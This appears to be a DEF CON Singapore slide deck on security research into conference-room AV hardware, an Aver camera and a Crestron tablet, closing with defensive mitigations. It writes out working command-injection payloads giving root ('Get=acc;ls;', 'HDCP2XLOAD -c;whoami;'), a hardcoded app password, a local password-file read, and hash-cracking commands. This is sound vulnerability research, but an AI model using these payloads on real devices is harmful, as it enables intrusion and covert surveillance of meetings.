---
marp: true
theme: default
class: invert
paginate: true
style: |
  section {
    background-color: #0d1117;
    color: #e6edf3;
    font-family: 'Segoe UI', system-ui, sans-serif;
    padding: 2em 2.5em;
  }
  h1 { color: #58a6ff; font-size: 1.8em; margin-bottom: 0.3em; }
  h2 { color: #79c0ff; font-size: 1.4em; border-bottom: 2px solid #30363d; padding-bottom: 0.2em; }
  h3 { color: #79c0ff; font-size: 1.15em; margin-bottom: 0.2em; }
  code {
    background: #161b22; color: #e6edf3;
    border: 1px solid #30363d; border-radius: 4px;
    padding: 0 4px; font-size: 0.82em;
  }
  pre { background: #161b22 !important; border: 1px solid #30363d; border-radius: 6px; padding: 0.8em; }
  pre code { border: none; font-size: 0.68em; line-height: 1.4; }
  ul li { margin-bottom: 0.3em; }
  table { width: 100%; border-collapse: collapse; font-size: 0.85em; }
  th { background: #161b22; color: #79c0ff; border: 1px solid #30363d; padding: 0.4em 0.7em; }
  td { border: 1px solid #30363d; padding: 0.4em 0.7em; }
  blockquote { border-left: 4px solid #f0883e; padding-left: 1em; color: #f0883e; }
  .mermaid-diagram { display: flex; justify-content: center; margin: 0.5em 0; }
  .mermaid-diagram svg { max-height: 420px; max-width: 100%; }
  .img-placeholder {
    border: 2px dashed #30363d; border-radius: 6px;
    background: #161b22; color: #8b949e;
    text-align: center; padding: 1.5em;
    font-size: 0.85em; font-style: italic; margin: 0.5em 0;
  }
  .tag {
    display: inline-block; background: #21262d;
    border: 1px solid #30363d; border-radius: 12px;
    padding: 0.1em 0.7em; font-size: 0.8em; color: #8b949e;
    margin-right: 0.3em;
  }
  .cve {
    display: inline-block; background: #3d1f00;
    border: 1px solid #f0883e; border-radius: 4px;
    padding: 0.1em 0.6em; font-size: 0.85em; color: #f0883e;
    font-family: monospace; font-weight: bold;
  }
  section.title {
    display: flex; flex-direction: column;
    justify-content: center; align-items: center; text-align: center;
    background: radial-gradient(ellipse at 50% 55%, #0c2d50 0%, #0d1117 65%);
  }
  section.title h1 { font-size: 2.5em; color: #58a6ff; margin-bottom: 0.2em; }
  section.title h2 { border: none; color: #8b949e; font-size: 1.0em; font-weight: normal; }
  section.title .subtitle { color: #8b949e; font-size: 0.95em; margin-top: 0.8em; }
  section.section-divider {
    display: flex; flex-direction: column;
    justify-content: center; align-items: center; text-align: center;
    background: radial-gradient(ellipse at 50% 50%, #2d1400 0%, #0d1117 65%);
  }
  section.section-divider h1 { font-size: 2.6em; color: #f0883e; }
  section.section-divider h2 { border: none; color: #8b949e; font-size: 1.1em; font-weight: normal; }
  section.bio h1 { font-size: 2em; }
---

<!-- _class: title -->

# Mic Drop

## Hacking into Enterprise Audiovisual Hardware

<br>

**DEF CON Singapore**
Eugene Lim

spaceraccoon.dev · @spaceraccoon

---

<!-- _class: bio -->

![bg right contain](./assets/spaceraccoon-singapore.png)

# About Me

**Eugene "Spaceraccoon" Lim**
Security Researcher

- Vulnerability research - finding bugs that matter
- Web, mobile, hardware, firmware
- _"Why would you connect that to the internet???"_

spaceraccoon.dev · @spaceraccoonsec · GitHub: spaceraccoon

---

# The Forgotten Attack Surface

> Some organisations' most sensitive information is only ever discussed **in person.**

![bg right:33%](./assets/meeting-room.jpg)

- Conference rooms, boardrooms, executive meeting spaces
- Ironically: **least-monitored**, most **insecurely-configured** hardware in the org
- Today: two devices, multiple critical vulnerabilities

---

# Agenda

- **🎥 Aver PTC320UV2**
  - Firmware analysis & CVE misclassification
  - Unauthenticated root RCE via command injection

- **📟 Crestron TSW-1060**
  - Crestron Terminal Protocol & hidden commands
  - Hardcoded credentials & local file disclosure
  - (Un)authenticated root RCE via command injection

- **🏢 Challenges and Next Steps**

---

<!-- _class: section-divider -->

# Aver PTC320UV2

---

# Aver PTC320UV2: Auto-Tracking Camera

![bg right:33% contain](./assets/aver-ptc320uv2.png)

- High-resolution, **auto-tracking** video conferencing camera
- Integrated into meeting room systems: Zoom Rooms, Teams Rooms
- Controlled via tablets, mobile apps, or web browser
- **Web management console** accessible over the network

---

# Prior Work: PTC310UV2 CVEs

<span class="cve">CVE-2025-45619</span> <span class="cve">CVE-2025-45620</span> - published by weedl

![height:400px](./assets/cve-2025-45619.png)

---

# Prior Work: PTC310UV2 CVEs

<span class="cve">CVE-2025-45619</span> <span class="cve">CVE-2025-45620</span> - published by weedl

![height:400px](./assets/cve-2025-45619-github.png)

---
# Prior Work: PTC310UV2 CVEs

<span class="cve">CVE-2025-45619</span> <span class="cve">CVE-2025-45620</span> - published by weedl

| Source | Description |
|---|---|
| CVE listing | Remote code execution via `SendAction` function |
| GitHub disclosure | Authentication bypass (client-side credential check) |

> `SendAction` is a **client-side** JS function. This is not RCE.

A good example of confusion in the disclosure process - researchers not always certain of root causes.

---

# Firmware Analysis

The `cgi-bin` binary handles all web API requests with hard-coded routes.

```c
iVar1 = strncmp(gRequestURI, "/action?", 8);
if (iVar1 == 0) {
    iVar1 = strncmp(param_2, "Get=", 4);
    if (iVar1 == 0) {
        pcVar2 = strstr(param_2, "Get=");
        local_2c = (byte *)(pcVar2 + 4);
        local_2c = (byte *)strtok_r((char *)local_2c, "&", &pcStack_251c);
        memset(local_1518, 0, 0x400);
        snprintf(local_1518, 0x3ff,
                 "/mnt/sky/webui/opt_GetData.sh %s 2>&1", local_2c);  // ← user input
        system_ctrl(local_1518, "/tmp/FIFO_CGI_TO_DISPATCH");
```

User-supplied `Get=` parameter passed **directly** to `snprintf` → `system_ctrl`. No sanitisation.

---

# `opt_GetData.sh` - The Shell Script

```bash
#!/bin/sh
dbus-send --session --print-reply \
    --dest=com.aver.ldn /ldn/Options \
    com.aver.ldn.OptionManager.GetData \
    string:$1
```

A simple configuration fetcher over D-Bus - but `$1` is **unquoted user input**.

> Classic command injection, even before reaching the shell script.

---

# Unauthenticated Root RCE

```bash
# No authentication required - single HTTP request
curl "http://<CAMERA_IP>/action?Get=acc;ls;"
```

```mermaid
flowchart LR
    A["Attacker\nHTTP GET"] -->|"/action?Get=acc;cmd;"| B["cgi-bin\nbinary"]
    B -->|"snprintf"| C["opt_GetData.sh\n$1 = acc;cmd;"]
    C -->|"shell"| D["root ✅"]
```

- **No authentication** required
- Executes as **root**
- Not just an auth bypass - actual **remote code execution**

---

<!-- _class: section-divider -->

# Crestron TSW-1060

---

# Crestron TSW-1060: Room Automation Tablet

![bg right:33% contain](./assets/crestron-tsw-1060.png)

- PoE Android tablet for meeting room booking, AV control, smart displays
- Discontinued - available on the secondary market **for under $50**
- Active Home Assistant community (shoutout to `KazWolfe`!)
- First risk: **factory wipe doesn't fully wipe user files** - sensitive data from original owners

---

# Attack Surface

```mermaid
flowchart TD
    TSW["Crestron TSW-1060"]
    TSW --> FTP["FTP Server"]
    TSW --> SSH["SSH Server"]
    TSW --> Telnet["Telnet"]
    TSW --> CTP["Crestron Terminal Protocol"]
    TSW --> Web["Web Interface"]
    TSW --> USB["USB Port"]
    TSW --> Apps["Android Apps"]
    style CTP stroke:#f0883e,stroke-width:2px
    style Apps stroke:#f0883e,stroke-width:2px
```

Each surface growing more vulnerable as the device reaches end-of-life.

---

# Crestron Terminal Protocol

A restricted console accessible over telnet, SSH, and port 41795.

```
TSW-1060>HELP ALL

8021XAUthenticate   Administrator   Enable/Disable 802.1x Authentication.
ADDBLOCKEDip        Administrator   Add an IP Address to the blocked list
...

TSW-1060>VERSION
TSW-1060 [v3.002.1061 (Tue Jun  4 16:32:15 EDT 2024), #885225CC]

TSW-1060>UUID ?
Error: Your user access prevents execution of this command.
       Contact your administrator.
```

Some commands locked behind a `crengsuperuser` factory/debug account.

---

# CVE-2018-13341: Deterministic Superuser Password

<span class="cve">CVE-2018-13341</span> - published 7 years ago, with a working Python script

```mermaid
flowchart LR
    A["Device MAC\nAddress"] --> B["SHA-1 Hash\n(hardcoded salt)"]
    B --> C["RC4 Encrypt\n(hardcoded key)"]
    C --> D["base62 Encode"]
    D --> E["crengsuperuser\npassword 🔑"]
```

> Who said CTFs weren't realistic?

---

# The "Fix" for CVE-2018-13341

```c
EthGetMacAddr(mac_bytes, 0);
ConvertMacAddressToString(mac_str, mac_bytes, fmt);
LocalConvertToUpper(mac_str);
iVar = GetEngDebugMode();
if ((iVar == 0) && strncmp(mac_str, "DE:AD:BE:EF:12:3", 16) != 0) {
    // FAIL: return "ERROR: Bad or Incomplete Command"
}
```

- All the **hardcoded crypto** is still present
- A **debug mode flag** bypasses the check entirely
- A MAC address of `DE:AD:BE:EF:12:3` also bypasses it

> A flag check is not a fix.

---

# Hidden Commands: AI-Assisted Ghidra Analysis

![bg right:33% contain](./assets/ghidra-scripts.png)

- `HELP ALL` returns an **incomplete list** - many "secret" commands buried in `a_console`
- Handler functions follow a consistent pattern with help strings as a guide
- Used **Claude Code + Ghidra scripts** for taint analysis - leaves a record of analysis scripts

> Initial Claude Code went in circles: it only searched `.rodata` for strings, missing those in `.data.rel.ro`. Had to manually correct.

---

# Handler Function Structure

```c
void cmd_setlockouttime(undefined4 param_1, undefined4 param_2,
                        byte *param_3, undefined4 param_4)
{
  uVar2 = AuthenticationGetEnabled();
  if (uVar2 == 0) {
    __s = "ERROR: Authentication is not on.\r\n";
  }
  else if ((param_3 == NULL) || (*param_3 == 0)) {
    // actual function body
    GetIpblkLockout(&local_134, ...);
    ...
  }
  else if (uVar2 == 0x3f) {
    // help string - extremely useful for understanding intent
    SendConsoleResponseToSymproc("SETLOCKOUTTIME [number]\r\n", ...);
    SendConsoleResponseToSymproc("\tnumber - hours to block...\r\n", ...);
  }
```

---

# HDCP2XLOAD: Hidden Command Injection

```c
void FUN_00063618(undefined4 param_1, undefined4 param_2,
                  char *param_3, undefined4 param_4)
{
  if (*param_3 == '-') {
    if (param_3[1] != 'c') {
      pcVar1 = "ERROR: this option is not supported\r\n";
      goto LAB_00063786;
    }
    pcVar1 = acStack_224;
    snprintf(pcVar1, 0x200, "@ske_upgrade@ %s", param_3);  // ← user input
    pFVar2 = (FILE *)popenCmd(pcVar1, &DAT_0007fbe8);
```

- Not present in `HELP` output
- Not present in console auto-complete
- Passes user input directly to `popenCmd`

---

# Root Shell via Hidden Command

```bash
TSW-1060> HDCP2XLOAD -c;whoami;
root
```

```mermaid
flowchart LR
    A["HDCP2XLOAD -c;cmd;"] --> B["a_console\nbinary"]
    B -->|"snprintf"| C["@ske_upgrade@\n-c;cmd;"]
    C -->|"shell"| D["root shell ✅"]
```

Command not listed, not autocompleted - security by obscurity only.

---

# Gingco Room Scheduler App

One of the default Android applications on the tablet - connects to a configured URL via WebView.

![Gingco not responding error page height:400px](./assets/gingco-not-responding.png)

---

# Gingco Room Scheduler App

Accessing Gingco's settings requires pressing three fingers for a few seconds, triggering a password dialog.

![Gingco password dialog height:400px](./assets/gingco-password-dialog.png)

---

# Hardcoded Password in APK

```xml
<!-- strings.xml inside Gingco APK -->
<string name="settings_password">gingco</string>
```

Default password hard-coded in `strings.xml`. No user configuration needed.

Once inside settings: configure any URL to load in the WebView.

```mermaid
flowchart LR
    A["Three-finger\npress"] --> B["Password dialog\n'gingco' hardcoded"]
    B --> C["Settings\npanel"]
    C --> D["file:///data/\ncrestron/passwd"]
    D --> E["Admin hashes\nin WebView 🔴"]
```

---

# Reading the Password File

```
admin:Administrators,:crcU0xdkOqlGIcr3AeKxsgzaYc
```

Interesting-looking hash - time to reverse it.

Analysis of `libLinuxUtil.so` → `addUserPasswordToFile` function:

```mermaid
flowchart LR
    A["Password: 'password'"] --> B["Special char escaping\n# and @ → \\# \\@"]
    B --> C["7-byte chunking\n'passwor' | 'd'"]
    C --> D["DES crypt per chunk\nDES_fcrypt(chunk, 'cr', output)\nfixed salt 'cr'"]
    D --> E["Concatenate chunk hashes\n→ 13 chars per chunk"]
```

---

# Weak DES Password Hashing

```bash
# Reproducing the hash in bash
p='password'; h=''; i=0
while [ $i -lt ${#p} ]; do
    h+=$(openssl passwd -crypt -salt cr "${p:$i:7}")
    i=$((i+7))
done
echo "$h"
# → crcU0xdkOqlGIcr3AeKxsgzaYc
```

DES with a fixed `cr` salt - each 7-byte chunk hashed independently.

> A DES crypt hash with a known, fixed salt. This will crack instantly.

---

# Cracking with Hashcat

```shell
hashcat -m 1500 chunk1.txt -a 3 -1 '?l' '?1?1?1?1?1?1?1'

crcU0xdkOqlGI:passwor

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1500 (descrypt, DES (Unix), Traditional DES)
Time.Started.....: Fri Apr 17 13:21:40 2026 (2 secs)
Time.Estimated...: Fri Apr 17 13:21:42 2026 (0 secs)
```

**2 seconds** on a CPU-only run (M5 chip). GPU would be faster.

Each chunk cracked independently - longer passwords only add linear cost.

---

# Attack Chain: Phase 1 - Credential Theft

```mermaid
flowchart LR
    A["Physical /\nNetwork Access"] --> B["Gingco\nthree-finger press"]
    B -->|"'gingco'"| C["WebView →\ncrestron/passwd"]
    C --> D["Admin hashes\nexfiltrated"]
    D -->|"Hashcat 2s"| E["Plaintext\ncredentials 🔑"]
    style E stroke:#f0883e,stroke-width:3px
```

---

# Attack Chain: Phase 2 - Exploitation

```mermaid
flowchart LR
    E["Plaintext\ncredentials 🔑"] --> F["CTP login"]
    F --> G["Root shell 🔴"]
    G --> H["Pivot · Persist\nSurveillance"]
    style E stroke:#f0883e,stroke-width:3px
    style G stroke:#f0883e,stroke-width:3px
    style H stroke:#f0883e,stroke-width:2px
```

---

# What's Possible from Root

From a root shell on a conference room tablet:

- **Network pivot** - jump into internal IT network via wired PoE connection
- **Persistence** - install backdoor, survive reboots
- **Surveillance** - access microphone, camera, screen via Android APIs
- **Lateral movement** - credentials often reused across AV systems

> The most sensitive conversations happen in these rooms.

---

<!-- _class: section-divider -->

# Challenges and Next Steps

---

# Why AV Hardware is Hard to Secure

```mermaid
flowchart TD
    A["Complex Legacy\nSoftware"] --> D["Quiet, Persistent\nExposure"]
    B["Infrequent\nPatching"] --> D
    C["Minimal\nMonitoring"] --> D
    style D stroke:#f0883e,stroke-width:3px
```

Three structural problems that compound each other.

---

# Challenge 1: Patching is Strongly Discouraged

> "Avoid patches as far as possible, especially for discontinued devices, because they can break easily and are hard to debug."
> - r/crestron

- AV hardware runs **24/7** - downtime is unacceptable
- Patches can break integrations unexpectedly
- Hundreds of devices in one org → patching at scale is nearly impossible
- Discontinued devices like the TSW-1060 may never receive patches

---

# Challenge 2: Insecure by Default

> "Every hardening guide recommendation is a missed opportunity for a safer default."
> - Kelly Shortridge

Crestron publishes an extensive security hardening guide - but:

- If it requires manual steps, most deployments skip it
- Managed service providers focus on **making it work**, not securing it
- "Security hardening" as an afterthought is not security

---

# Challenge 3: Poor Visibility and Monitoring

```mermaid
flowchart LR

    subgraph Corp[Corporate Network]
        A[User Endpoints]
        B[Identity Systems]
    end

    subgraph Prod[Production Network]
        C[Servers / Applications]
        D[Network Devices]
        E[Cloud Services]
    end

    subgraph AVNet[IT / AV Network]
        F[AV Systems]
    end

    subgraph Col[Collection Layer]
        G[Collectors / Agents]
        H[Syslog / APIs]
    end

    I[SIEM & SecOps]

    %% Corporate monitored
    A --> G
    B --> G

    %% Production monitored
    C --> G
    D --> H
    E --> H

    %% Into SIEM
    G --> I
    H --> I

    %% AV gap
    F -. No logging / monitoring .-> I

    %% Cross-network risk
    F -. Pivot risk .-> A
    F -. Pivot risk .-> D
```

- Bespoke systems - no standard EDR or monitoring agent support
- IT team/MSPs may not be cybersecurity-trained; AV is a secondary concern

---

# Additional Risks

| Risk | Example |
|---|---|
| **Supply chain** | Unmaintained apps with dangling remote resources |
| **Application sandboxing** | Gingco WebView reads arbitrary local files |
| **Trace data on resale** | Factory wipe doesn't clear user projects or FTP data |
| **Legacy crypto** | DES with fixed salt, RC4 with hardcoded key |
| **Physical access** | Ethernet ports behind wall plates, accessible to visitors |

---

<!-- _class: section-divider -->

# Conclusion

---

# Defence-in-Depth at the Network Level

The vulnerabilities are real but the mitigations aren't novel:

| Control | Mechanism |
|---|---|
| **Network isolation** | Segment AV devices from corp network |
| **MAC address whitelisting** | Block unknown devices automatically |
| **Zero internet egress** | Prevent AV hardware from phoning home or downloading malware |
| **Physical security** | Lock wall plates, cable closets, PoE switches |

> Software vulnerabilities aside - sometimes it's just a matter of unscrewing a few wall plates to reach an ethernet port.

---

# Takeaways

- **AV hardware is a real attack surface** - often overlooked because it "just works"
- **Vulnerability disclosure is messy** - even CVE listings can misclassify root causes
- **AI-assisted firmware analysis is effective** - but requires guidance and correction
- **Legacy and discontinued devices compound risk** - no patches, no monitoring, full exposure
- **Defence-in-depth is your best bet** - network segmentation and access control go a long way

---

<!-- _class: title -->

# Mic Drop

## Hacking into Enterprise Audiovisual Hardware

<br>

**DEF CON Singapore** · Eugene Lim

spaceraccoon.dev · @spaceraccoon

_Questions?_
